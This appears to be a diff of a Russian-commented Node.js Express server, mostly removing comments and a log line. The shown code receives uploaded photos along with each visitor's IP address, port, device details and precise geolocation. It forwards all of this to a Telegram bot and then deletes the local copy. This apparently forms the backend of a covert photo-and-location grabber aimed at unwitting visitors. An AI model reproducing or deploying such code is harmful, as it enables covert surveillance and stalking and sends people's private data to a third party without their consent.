@@ -36,7 +36,6 @@ app.use(express.static('public'));
 
 // ===== ПОЛУЧЕНИЕ IP И ПОРТА =====
 function getClientInfo(req) {
-    // IP
     const forwarded = req.headers['x-forwarded-for'];
     let ip = forwarded ? forwarded.split(',')[0].trim() : 
              req.socket.remoteAddress || 
@@ -47,7 +46,6 @@ function getClientInfo(req) {
         ip = ip.substring(7);
     }
     
-    // ПОРТ
     let port = req.socket.remotePort || 
                req.connection.remotePort || 
                'unknown';
@@ -65,7 +63,6 @@ async function sendToTelegram(photoPath, metadata, clientInfo) {
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
         
-        // Формируем подпись с полными данными
         const ts = metadata.timestamp || {};
         const device = metadata.device || {};
         const location = metadata.location || {};
@@ -90,13 +87,12 @@ async function sendToTelegram(photoPath, metadata, clientInfo) {
         caption += `━━━━━━━━━━━━━━━━━\n`;
         caption += `🌐 IP ИНФОРМАЦИЯ:\n`;
         caption += `  • IP: ${ip.ip || clientInfo.ip || 'unknown'}\n`;
-        caption += `  • Порт: ${clientInfo.port || 'unknown'}\n`;  // ← ДОБАВЛЕН ПОРТ
+        caption += `  • Порт: ${clientInfo.port || 'unknown'}\n`;
         if (ip.country) caption += `  • Страна: ${ip.country}\n`;
         if (ip.city) caption += `  • Город: ${ip.city}\n`;
         if (ip.isp) caption += `  • Провайдер: ${ip.isp}\n`;
         caption += `━━━━━━━━━━━━━━━━━\n`;
         
-        // Геолокация
         if (location.available) {
             caption += `📍 ГЕОЛОКАЦИЯ:\n`;
             caption += `  • Широта: ${location.latitude?.toFixed(6) || '?'}\n`;
@@ -116,11 +112,9 @@ async function sendToTelegram(photoPath, metadata, clientInfo) {
         formData.append('caption', caption);
         formData.append('parse_mode', 'HTML');
         
-        // Добавляем фото, если есть
         if (photoPath && fs.existsSync(photoPath)) {
             formData.append('photo', fs.createReadStream(photoPath));
         } else {
-            // Если нет фото, отправляем просто текст
             const textUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
             const textData = new FormData();
             textData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -158,12 +152,9 @@ app.post('/upload', upload.single('photo'), async (req, res) => {
         const filename = req.file ? req.file.filename : null;
         
         console.log(`📸 Получены данные от: ${clientInfo.ip}:${clientInfo.port}`);
-        console.log(`📊 Метаданные:`, metadata);
         
-        // Отправляем в Telegram
         await sendToTelegram(photoPath, metadata, clientInfo);
         
-        // Удаляем файл после отправки
         if (photoPath && fs.existsSync(photoPath)) {
             fs.unlink(photoPath, (err) => {
                 if (err) console.error('Ошибка удаления файла:', err);
@@ -193,5 +184,4 @@ app.get('/', (req, res) => {
 app.listen(PORT, () => {
     console.log(`🚀 Сервер запущен на порту ${PORT}`);
     console.log(`🤖 Telegram: ${TELEGRAM_TOKEN ? '✅ настроен' : '❌ не настроен'}`);
-    console.log(`📨 Chat ID: ${TELEGRAM_CHAT_ID ? '✅ установлен' : '❌ не установлен'}`);
 });
